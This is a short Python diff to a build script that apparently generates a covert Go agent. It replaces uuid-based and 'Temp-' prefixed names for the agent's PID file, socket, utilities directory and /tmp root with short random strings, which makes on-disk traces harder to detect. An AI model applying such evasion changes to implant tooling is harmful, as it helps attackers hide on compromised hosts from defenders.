@@ -60,15 +60,23 @@ class GoBuild:
         if 'pid_file' in CACHED_CONF:
             self.PIDFile = CACHED_CONF['pid_file']
         else:
-            self.PIDFile = str(uuid.uuid1())
+            self.PIDFile = rand_str(random.randint(3, 10))
             CACHED_CONF['pid_file'] = self.PIDFile
+
+        # util path name
+
+        if 'utils_path' in CACHED_CONF:
+            self.UtilsPath = CACHED_CONF['utils_path']
+        else:
+            self.UtilsPath = rand_str(random.randint(3, 10))
+            CACHED_CONF['utils_path'] = self.UtilsPath
 
         # socket name
 
         if 'socket' in CACHED_CONF:
             self.Socket = CACHED_CONF['socket']
         else:
-            self.Socket = str(uuid.uuid1())
+            self.Socket = rand_str(random.randint(3, 10))
             CACHED_CONF['socket'] = self.Socket
 
         # indicator text
@@ -84,7 +92,7 @@ class GoBuild:
         if "agent_root" in CACHED_CONF:
             self.AgentRoot = CACHED_CONF['agent_root']
         else:
-            self.AgentRoot = f"/tmp/Temp-{uuid.uuid4()}"
+            self.AgentRoot = f"/tmp/{rand_str(random.randint(5, 10))}"
             CACHED_CONF['agent_root'] = self.AgentRoot
 
         # DoH
@@ -255,6 +263,11 @@ class GoBuild:
         sed("./lib/data/def.go",
             '''SocketName = AgentRoot + "/.socket"''',
             f'''SocketName = AgentRoot + "/{self.Socket}"''')
+
+        # utils path
+        sed("./lib/data/def.go",
+            '''UtilsPath = AgentRoot + "/bin"''',
+            f'''UtilsPath = AgentRoot + "/{self.UtilsPath}"''')
 
         # PID file name
         sed("./lib/data/def.go",
